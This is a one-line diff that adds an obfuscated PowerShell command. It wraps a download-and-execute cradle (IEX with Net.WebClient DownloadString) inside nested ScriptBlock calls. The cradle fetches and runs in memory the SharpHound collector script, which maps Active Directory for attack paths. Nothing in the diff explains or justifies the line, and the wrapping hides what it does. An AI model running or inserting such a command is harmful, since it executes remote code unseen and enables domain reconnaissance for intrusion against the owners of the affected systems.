@@ -1,0 +1,1 @@
+& ([ScriptBlock]::Create([string]::Join('','[ScriptBlock]::Create("IEX (New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/SpecterOps/BloodHound-Legacy/refs/heads/master/Collectors/SharpHound.ps1'')")')))
